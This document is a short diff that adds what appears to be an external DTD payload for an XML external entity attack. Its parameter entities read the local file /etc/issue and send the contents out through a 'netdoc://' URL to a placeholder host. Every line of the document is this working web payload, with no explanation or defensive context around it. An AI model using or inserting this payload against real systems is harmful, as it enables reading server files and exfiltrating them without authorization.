@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/issue">
+<!ENTITY % run "<!ENTITY &#x25; exfil SYSTEM 'netdoc://a://?a=%file;'>">
+%run;
+%exfil;
